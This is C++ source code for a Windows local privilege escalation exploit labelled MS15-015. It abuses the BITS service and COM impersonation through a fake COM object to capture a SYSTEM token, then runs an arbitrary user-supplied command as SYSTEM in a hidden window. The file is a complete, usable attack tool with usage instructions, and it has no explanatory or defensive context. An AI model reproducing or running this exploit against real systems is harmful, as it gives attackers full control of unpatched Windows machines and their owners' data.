#include <bits.h>
#include <stdio.h>
#include <comdef.h>
#include <sddl.h>
#include <Windows.h>
IID IID_FakeInterface = { 0x6EF2A660, 0x47C0, 0x4666, { 0xB1, 0x3D, 0xCB, 0xB7, 0x17, 0xF2, 0xFA, 0x2C, } };
class FakeObject : public IUnknown
{
	LONG m_lRefCount;
	HANDLE* m_ptoken;
	void TryImpersonate()
	{
		if(*m_ptoken == nullptr)
		{
			HRESULT hr = CoImpersonateClient();
			if (SUCCEEDED(hr))
			{
				HANDLE hToken;
				if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken))
				{
					PTOKEN_USER user = (PTOKEN_USER)malloc(0x1000);
					DWORD ret_len = 0;
					if (GetTokenInformation(hToken, TokenUser, user, 0x1000, &ret_len))
					{
						LPWSTR sid_name;
						ConvertSidToStringSidW(user->User.Sid, &sid_name);
						if ((wcscmp(sid_name, L"S-1-5-18") == 0) && (*m_ptoken == nullptr))
						{
							*m_ptoken = hToken;
							RevertToSelf();
						}
						else
						{
							CloseHandle(hToken);
						}
						LocalFree(sid_name);
					}
					free(user);
					RevertToSelf();
				}
			}
		}
	}
public:
	FakeObject(HANDLE* ptoken) {
		m_lRefCount = 1;
		m_ptoken = ptoken;
		*m_ptoken = nullptr;
	}
	~FakeObject() {};
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{
		TryImpersonate();

		if (riid == __uuidof(IUnknown))
		{
			*ppvObj = this;
		}
		else if (riid == IID_FakeInterface)
		{
			*ppvObj = this;
		}
		else
		{
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		TryImpersonate();
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		TryImpersonate();
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);
		if (0 == ulCount)
		{
			delete this;
		}
		return ulCount;
	}
};

_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));


HANDLE GetSystemToken()
{
	CoInitialize(NULL);
	HANDLE token = nullptr;
	IBackgroundCopyJobPtr pJob;
	HRESULT hr=0;
	IBackgroundCopyManagerPtr pQueueMgr;
	IMonikerPtr pNotify;
	hr = CoInitializeSecurity(NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_CONNECT,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		EOAC_DYNAMIC_CLOAKING,
		0);
	if (FAILED(hr))
	{
		printf("[x] CoInitializeSecurity err : 0x%x\n",hr);
		goto end;
	}

	CreatePointerMoniker(new FakeObject(&token), &pNotify);
	hr = CoCreateInstance(__uuidof(BackgroundCopyManager), NULL,CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pQueueMgr));
	if (FAILED(hr))
	{
		printf("[x] CoCreateInstance err : 0x%x\n",hr);
		goto end;
	}
	GUID guidJob;
	hr = pQueueMgr->CreateJob(L"BitsAuthSample",
		BG_JOB_TYPE_DOWNLOAD,
		&guidJob,
		&pJob);
	if (FAILED(hr))
	{
		printf("[x] CreateJob err : 0x%x\n",hr);
		goto end;
	}
	pJob->SetNotifyInterface(pNotify);
end:
	if (pJob)
	{
		pJob->Cancel();
	}
	return token;
}
void wmain(int argc,WCHAR* argv[])
{
	printf("[#] ms15-015 compiled by zcgonvh\n");
	if(argc!=2)
	{
		printf("[#] usage: ms15-015 command \n");
		printf("[#] eg: ms15-015 \"whoami /all\" \n");
		return;
	}
	HANDLE tkn=GetSystemToken();
	if(!tkn)
	{
		printf("[x] can not get SYSTEM token!\n");
		return;
	}
	else
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si); 
		si.lpDesktop= L"WinSta0\\Default";
		si.dwFlags=STARTF_USESHOWWINDOW;
		si.wShowWindow=SW_HIDE;
		ZeroMemory(&pi,sizeof(pi));
		if(CreateProcessAsUser(tkn,NULL,_wcsdup(argv[1]),0,0,true,0,0,0,&si,&pi))
		{
			printf("[!] process with pid:%d created.\n==============================\n",pi.dwProcessId);
			fflush(stdout);
			WaitForSingleObject(pi.hProcess,-1);
		}
		else
		{
			printf("[x] can not create process:%d\n",GetLastError());
		}

	}
}

